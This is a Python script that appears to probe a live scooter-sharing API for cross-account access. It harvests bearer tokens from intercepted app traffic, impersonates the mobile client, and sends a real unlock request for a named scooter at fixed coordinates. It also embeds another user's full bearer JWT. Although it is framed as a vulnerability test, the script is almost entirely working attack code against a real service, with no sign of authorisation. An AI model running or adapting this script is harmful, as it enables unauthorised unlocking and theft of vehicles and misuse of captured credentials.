#!/usr/bin/env python3
"""
Test Cross-Account Access with New Account Token
"""

import requests
import json
import time
from datetime import datetime

# API Configuration
BASE_URL = "https://api.knotcity.io"
UNLOCK_ENDPOINT = "/api/application/vehicles/unlock"
LOCK_ENDPOINT = "/api/application/vehicles/freefloat/lock"

# Headers template
def get_headers(bearer_token):
    return {
        "Authorization": bearer_token,
        "Content-Type": "application/json",
        "User-Agent": "MaynDrive/1.1.34 (Android; Mobile)",
        "Accept": "application/json"
    }

# Test scooter data
TEST_SCOOTER = {
    "serial": "TUF061",  # The scooter we successfully unlocked before
    "lat": 47.39027698832425,
    "lng": 0.6889144890010357
}

def test_token_validity(bearer_token):
    """Test if the new account token is valid"""
    print("🔍 Testing new account token validity...")
    
    headers = get_headers(bearer_token)
    
    try:
        response = requests.get(f"{BASE_URL}/api/application/vehicles", headers=headers, timeout=10)
        print(f"   Status: {response.status_code}")
        if response.status_code in [200, 404]:
            print("✅ New account token is VALID!")
            return True
        else:
            print(f"❌ New account token invalid: {response.status_code}")
            return False
    except Exception as e:
        print(f"❌ Error testing token: {e}")
        return False

def test_cross_account_unlock(bearer_token, scooter_data):
    """Test if new account can unlock the same scooter"""
    print(f"🔓 Testing cross-account unlock with new token...")
    print(f"   Scooter: {scooter_data['serial']}")
    print(f"   Location: {scooter_data['lat']}, {scooter_data['lng']}")
    
    headers = get_headers(bearer_token)
    payload = {
        "serial_number": scooter_data["serial"],
        "lat": scooter_data["lat"],
        "lng": scooter_data["lng"]
    }
    
    try:
        response = requests.post(f"{BASE_URL}{UNLOCK_ENDPOINT}", 
                               headers=headers, 
                               json=payload, 
                               timeout=15)
        
        print(f"   Status: {response.status_code}")
        print(f"   Response: {response.text}")
        
        if response.status_code == 200:
            print("🚨 CRITICAL: New account can unlock the same scooter!")
            print("🚨 This indicates a SYSTEM-WIDE vulnerability!")
            return True
        elif response.status_code == 403:
            print("✅ Good: New account cannot unlock (permission denied)")
            print("✅ This indicates proper user isolation")
            return False
        elif response.status_code == 400:
            print("❌ Bad request - checking error details...")
            try:
                error_data = response.json()
                print(f"   Error: {error_data}")
            except:
                print(f"   Raw error: {response.text}")
            return False
        else:
            print(f"❌ Unexpected response: {response.status_code}")
            return False
            
    except Exception as e:
        print(f"❌ Error during cross-account test: {e}")
        return False

def compare_tokens(original_token, new_token):
    """Compare the two tokens to see if they're different"""
    print("🔍 Comparing tokens...")
    
    # Extract JWT payloads if possible
    try:
        import base64
        
        # Original token
        original_payload = original_token.split('.')[1]
        original_decoded = base64.b64decode(original_payload + '==').decode('utf-8')
        original_data = json.loads(original_decoded)
        
        # New token
        new_payload = new_token.split('.')[1]
        new_decoded = base64.b64decode(new_payload + '==').decode('utf-8')
        new_data = json.loads(new_decoded)
        
        print("📊 Token Comparison:")
        print(f"   Original User ID: {original_data.get('user_id', 'N/A')}")
        print(f"   New User ID: {new_data.get('user_id', 'N/A')}")
        print(f"   Original Session: {original_data.get('session_id', 'N/A')}")
        print(f"   New Session: {new_data.get('session_id', 'N/A')}")
        
        if original_data.get('user_id') != new_data.get('user_id'):
            print("✅ Tokens are from different users")
            return True
        else:
            print("❌ Tokens appear to be from the same user")
            return False
            
    except Exception as e:
        print(f"❌ Error comparing tokens: {e}")
        return False

def extract_new_token():
    """Automatically extract the new account token from captured data"""
    print("🔍 Automatically extracting new account token...")
    
    # Try multiple possible capture files
    capture_files = [
        'CAPTURED_NEW_ACCOUNT.txt',
        'CAPTURED_WORKING_FINAL.txt', 
        'CAPTURED_API_DECRYPT.txt',
        'CAPTURED_API.txt'
    ]
    
    for filename in capture_files:
        try:
            print(f"   Checking {filename}...")
            with open(filename, 'r', encoding='utf-8') as f:
                content = f.read()
            
            # Look for Bearer tokens in the content
            import re
            bearer_pattern = r'Bearer eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+'
            tokens = re.findall(bearer_pattern, content)
            
            if tokens:
                # Get the most recent token (last one found)
                new_token = tokens[-1]
                print(f"✅ Found token in {filename}: {new_token[:50]}...")
                return new_token
            else:
                print(f"   No Bearer tokens found in {filename}")
                
        except FileNotFoundError:
            print(f"   {filename} not found")
            continue
        except Exception as e:
            print(f"   Error reading {filename}: {e}")
            continue
    
    print("❌ No Bearer tokens found in any capture files")
    return None

def main():
    print("=" * 80)
    print("🚨 CROSS-ACCOUNT ACCESS TEST")
    print("=" * 80)
    print("⚠️  WARNING: This tests if any user can unlock any scooter!")
    print("=" * 80)
    
    # Automatically extract the new account token
    new_token = extract_new_token()
    
    if not new_token:
        print("\n📝 Manual token entry:")
        print("   (Copy from CAPTURED_NEW_ACCOUNT.txt)")
        new_token = input("New Bearer token: ").strip()
        
        if not new_token.startswith("Bearer "):
            new_token = "Bearer " + new_token
    else:
        print(f"✅ Using automatically extracted token")
    
    # Original token for comparison
    original_token = "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMDM0OTMsInNlc3Npb25faWQiOiI5MzY1MTQ5Yi1lZDdkLTQ1Y2MtYTZiMi1lYTU0NmMyOWE2NGUiLCJpYXQiOjE3NTk0NDQxMDcsImV4cCI6MTc1OTQ0NzcwN30.ge09yj7PfvFgPeJsQmmfcm74YuQaU-dAgxtW21q-LHY"
    
    print("\n" + "=" * 80)
    print("🧪 RUNNING CROSS-ACCOUNT TESTS")
    print("=" * 80)
    
    # Test 1: Compare tokens
    print("\n1️⃣ TOKEN COMPARISON")
    print("-" * 40)
    different_users = compare_tokens(original_token, new_token)
    
    # Test 2: Validate new token
    print("\n2️⃣ NEW TOKEN VALIDATION")
    print("-" * 40)
    if not test_token_validity(new_token):
        print("❌ Cannot proceed - new token is invalid")
        return
    
    # Test 3: Cross-account unlock test
    print("\n3️⃣ CROSS-ACCOUNT UNLOCK TEST")
    print("-" * 40)
    cross_account_success = test_cross_account_unlock(new_token, TEST_SCOOTER)
    
    # Test 4: Summary and analysis
    print("\n4️⃣ SECURITY ANALYSIS")
    print("-" * 40)
    
    if cross_account_success:
        print("🚨 CRITICAL VULNERABILITY CONFIRMED!")
        print("🚨 ANY USER CAN UNLOCK ANY SCOOTER!")
        print("🚨 This is a SYSTEM-WIDE security flaw!")
        print("\n📊 Impact Assessment:")
        print("   - Severity: CRITICAL")
        print("   - Scope: System-wide")
        print("   - Exploitability: High")
        print("   - Business Impact: Severe")
    else:
        print("✅ GOOD: User isolation is working")
        print("✅ New account cannot access other users' scooters")
        print("\n📊 Security Assessment:")
        print("   - Severity: MEDIUM (user-specific issue)")
        print("   - Scope: User-specific")
        print("   - Exploitability: Medium")
        print("   - Business Impact: Moderate")
    
    print("\n" + "=" * 80)
    print("🎯 TEST COMPLETE")
    print("=" * 80)

if __name__ == "__main__":
    main()
